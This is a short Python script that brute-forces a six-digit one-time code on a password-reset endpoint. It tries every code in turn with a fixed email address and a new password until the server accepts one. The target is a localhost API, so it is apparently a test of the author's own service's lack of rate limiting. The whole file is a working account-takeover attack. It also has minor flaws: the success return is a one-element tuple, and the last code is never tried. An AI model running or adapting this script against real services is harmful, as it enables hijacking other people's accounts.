import requests

def guess_otp():
    url = "http://127.0.0.1:8000/api/Reset_password/"

    otp_code = 100000
    for i in range(100000, 999999):
        otp_code = i
        params = {
            "email": "emma@gmail.com",
            "new_password": "emma1234",
            "otp_code": str(otp_code)
        }

        response = requests.post(url, params=params)
        print("current otp code is ", otp_code)
        if response.status_code == 200:
            return True, 

    return False, None

print(guess_otp())
